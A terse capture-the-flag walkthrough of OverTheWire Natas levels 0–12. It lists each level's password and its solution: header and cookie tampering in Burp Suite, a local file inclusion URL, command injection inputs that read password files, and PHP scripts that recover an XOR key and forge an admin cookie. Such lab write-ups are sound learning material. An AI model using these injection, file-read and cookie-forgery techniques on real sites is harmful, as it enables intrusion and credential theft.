0 -> 1: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
1 -> 2: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
2 -> 3: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH `used linkofnatas3/files as there was a picture in files in page source that was used and the files had: the picture + user.txt`
3 -> 4: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ `go on http://natas3.natas.labs.overthewire.org/robots.txt there /s3cr3t/ is disallowed so go on this page and you'll find user.txt`
4 -> 5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK `Using burpsuite: change referer from url of natas4 to natas5 as the webpage suggest and send to repeater`
5 -> 6: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned `In burpsuite, turn loggedin from 0 to 1`
6 -> 7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS `in code it says to go to /includes/secret.inc in url and the secret there is: FOEIUWGHFEEUHOFUOIU so enter this in the textbox on webpage`
7 -> 8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q  `hint: password for webuser natas8 is in /etc/natas_webpass/natas8 is commented in home page source then type this in url: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
8 -> 9: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t `go hex to string and get: ==QcCtmMml1ViV3b reverse it and decode it to get: oubWYf2kBq`
9 -> 10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu `use semicolon to run to commands at the same time e.g: ; ls will show output: dictionary.txt so type in this to get the pass: ; cat /etc/natas_webpass/natas10 `
10 -> 11: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk `Now instead of semicolon we use "a /etc/natas_webpass/natas11" Keep in mind / is not forbidden but that which surrounded by slashes i.e. ; | & is forbidden. Pass contained an a so it worked, it would also work for d but not b or c. Without 'a', it would treat /etc/ command as text to grep but with a it treats the payload as a file to read`
11 -> 12: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB `Cookie: HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIDFWXCZmTRg%3D The % sign indicated it is a URL encryption as certain characters are turned their ascii values. `
`A) "showpassword"=>"no", "bgcolor"=>"#ffffff" this is the plain text
`B) UNKNOWN (we find this using xor encryption)
`C) HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIDFWXCZmTRg%3D ciphertext
`We rewrite the application source code to xor what we know into B)`
`php code1 return: eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeL && key = eDWo               and code2 returns: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5 this is the cookie value, replace this for the old data cookie..reload webpage`                          
#### PHP code1 :
```
<?
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D";
echo xor_encrypt(base64_decode($cookie));
?>
```
#### PHP code2:
```

<?
function xor_encrypt($in) {
    $key = "eDWo";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
echo base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))))
?>
```